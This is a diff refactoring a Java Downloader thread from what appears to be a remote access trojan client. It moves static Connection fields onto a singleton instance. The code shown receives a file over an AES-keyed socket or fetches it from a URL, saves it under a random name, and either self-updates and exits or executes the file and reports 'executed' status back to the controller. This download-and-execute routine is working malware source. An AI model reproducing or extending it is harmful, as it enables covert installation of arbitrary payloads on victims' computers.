@@ -30,7 +30,7 @@ public class Downloader extends Thread {
 
 	public void run() {
 		try {
-			Connection.status(Constants.STATUS_DOWNLOADING_FILE);
+			Connection.instance.status(Constants.STATUS_DOWNLOADING_FILE);
 
 			String fileName = (new Random().nextInt()) + type.getExtension();
 
@@ -50,7 +50,7 @@ public class Downloader extends Thread {
 				
 				
 				if (readFromSocket) {
-					new FileIO().readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.aesKey);					
+					new FileIO().readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.aesKey);					
 				} else {
 					URLConnection con = new URL(url).openConnection();
 					InputStream in = con.getInputStream();
@@ -70,7 +70,7 @@ public class Downloader extends Thread {
 
 				if (update) {
 					try {
-						Connection.socket.close();
+						Connection.instance.getSocket().close();
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
@@ -80,7 +80,7 @@ public class Downloader extends Thread {
 					System.exit(0);
 				} else {
 					type.execute(file);
-					Connection.status(Constants.STATUS_EXECUTED_FILE);
+					Connection.instance.status(Constants.STATUS_EXECUTED_FILE);
 				}
 			} finally {
 
